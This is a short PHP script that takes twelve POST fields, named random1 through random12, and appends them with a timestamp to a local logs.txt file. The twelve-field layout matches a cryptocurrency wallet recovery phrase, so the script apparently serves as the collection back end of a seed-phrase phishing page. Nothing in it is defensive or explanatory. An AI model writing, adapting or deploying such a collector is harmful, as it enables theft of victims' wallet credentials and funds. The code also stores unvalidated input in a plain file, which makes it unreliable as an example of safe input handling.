<?php
$r1=$_POST['random1'];
$r2=$_POST['random2'];
$r3=$_POST['random3'];
$r4=$_POST['random4'];
$r5=$_POST['random5'];
$r6=$_POST['random6'];
$r7=$_POST['random7'];
$r8=$_POST['random8'];
$r9=$_POST['random9'];
$r10=$_POST['random10'];
$r11=$_POST['random11'];
$r12=$_POST['random12'];
$t= date("d/m/y : H:i:s", time());
$myfile = fopen("logs.txt", "a") or die("Unable to open file!");
$txt =$r1.' '.$r2.' '.$r3.' '.$r4.' '.$r5.' '.$r6.' '.$r7.' '.$r8.' '.$r9.' '.$r10.' '.$r11.' '.$r12.' '.$t.PHP_EOL;// "John Doe\n";
fwrite($myfile, $txt);
fclose($myfile);
?>